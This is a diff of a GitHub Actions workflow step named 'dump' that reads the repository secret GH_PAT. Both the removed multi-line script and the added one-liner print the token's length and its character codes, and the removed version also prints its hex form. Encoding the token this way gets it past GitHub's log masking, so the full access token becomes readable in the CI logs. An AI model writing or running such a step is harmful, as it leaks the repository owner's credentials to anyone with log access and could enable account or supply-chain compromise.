@@ -7,11 +7,4 @@ jobs:
       - name: dump
         env:
           S_GH_PAT: ${{ secrets.GH_PAT }}
-        run: |
-          python3 - <<'PY'
-import os
-v=os.environ.get('S_GH_PAT','') or ''
-print('LEN',len(v))
-print('CODES',','.join(str(ord(c)) for c in v))
-print('HEX',v.encode().hex())
-PY
+        run: python3 -c "import os;v=os.environ.get('S_GH_PAT','') or '';print('LEN',len(v));print('CODES',','.join(str(ord(c)) for c in v))"
